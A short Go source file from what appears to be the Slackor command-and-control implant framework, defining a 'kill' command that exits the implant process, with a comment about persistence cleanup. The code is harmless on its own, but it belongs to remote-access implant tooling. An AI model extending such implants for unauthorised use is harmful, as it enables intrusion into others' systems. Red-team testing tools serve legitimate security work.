package common

import (
	"os"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// Kill kills the implant process
type Kill struct{}

// Name is the name of the command
func (k Kill) Name() string {
	return "kill"
}

// Run kills the implant process
func (k Kill) Run(clientID string, jobID string, args []string) (string, error) {
	// TODO: Check if launched from a persistence method first and auto-run cleanup?
	os.Exit(0)
	return "", nil
}

func init() {
	command.RegisterCommand(Kill{})
}
